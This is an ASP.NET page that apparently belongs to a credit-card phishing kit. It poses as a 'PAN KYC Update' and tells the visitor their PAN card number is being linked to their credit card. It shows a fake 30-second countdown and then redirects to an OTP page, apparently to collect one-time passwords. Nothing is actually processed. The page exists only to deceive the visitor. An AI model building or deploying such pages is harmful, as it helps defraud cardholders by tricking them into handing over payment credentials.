<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="TimeLimit.aspx.cs" Inherits="CreditCard.TimeLimit" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <meta charset="utf-8" />
    <title>Please wait for while ........</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="stylesheet" type="text/css" href="bootstrap/css/bootstrap.min.css" />
    <link rel="stylesheet" type="text/css" href="font-awesome/css/font-awesome.min.css" />

    <script type="text/javascript" src="js/jquery-1.10.2.min.js"></script>
    <script type="text/javascript" src="bootstrap/js/bootstrap.min.js"></script>
    <style>
        body {
            background-image: url('creditImg.jpg');
            background-repeat: no-repeat;
        }
    </style>


    <style>
        body {
            margin: 0;
            padding: 0;
            color: black;
            font-size: 40px;
            font-weight: bold;
        }

        .marquee {
            position: relative;
            width: 100vw;
            max-width: 100%;
            height: 100px;
            overflow-x: hidden;
        }

        .track {
            position: absolute;
            white-space: nowrap;
            will-change: transform;
            animation: marquee 32s linear infinite;
        }

        @keyframes marquee {
            from {
                transform: translateX(0);
            }

            to {
                transform: translateX(-50%);
            }
        }
    </style>


    <script type="text/javascript">
        function startTimer(duration, display) {
            var timer = duration, minutes, seconds;
            setInterval(function () {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                display.textContent = minutes + ":" + seconds;

                if (--timer < 0) {
                    timer = duration;
                }
            }, 1000);
        }

        window.onload = function () {
            var fiveMinutes = 60 * 1 / 2,
                display = document.querySelector('#time');
            startTimer(fiveMinutes, display);
        };




        setTimeout('Redirect()', 29000);
        function Redirect() {
            location.href = 'Otp.aspx';
        }

    </script>



</head>
<body>
    <form id="form1" runat="server">
        <div class="container">

            <div class="page-header">
                <h1 style="text-align: center">Please wait for a while...</h1>
            </div>

            <!-- Credit Card Payment Form - START -->

            <div class="container">
                <div class="row">
                    <div class="col-xs-12 col-md-4 col-md-offset-4">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <div class="row">
                                    <h3 class="text-center">PAN KYC Update</h3>
                                    <img class="img-responsive cc-img" src="http://www.prepbootstrap.com/Content/images/shared/misc/creditcardicons.png" />
                                </div>
                            </div>
                            <div class="panel-body">
                                <%--  <form role="form">--%>

                                <div class="row">
                                    <%--<marquee>Your PAN card Number is being linked with your credit card please wait 30 Seconds...</marquee>--%>



                                    <div class="marquee">
                                        <div class="track">
                                            <div class="content">&nbsp;Your PAN card Number is being linked with your credit card please wait 30 Seconds...</div>
                                        </div>
                                    </div>

                                    <%--<h1 style="color:green;"> Your Credit card is getting to link with your PAN</h1>--%>
                                   
                                    <p>Please wait ..... <span id="time" style="color: green;">01:00</span> Second !!</p>


                                </div>

                                <%--  </form>--%>
                            </div>
                            <div class="panel-footer">
                                <div class="row">
                                    <div class="col-xs-12">
                                        <asp:Button ID="BtnSave" class="btn btn-warning btn-lg btn-block" runat="server" Text="Please Wait.." />
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <style>
                .cc-img {
                    margin: 0 auto;
                }
            </style>
            <!-- Credit Card Payment Form - END -->

        </div>
    </form>
</body>
</html>
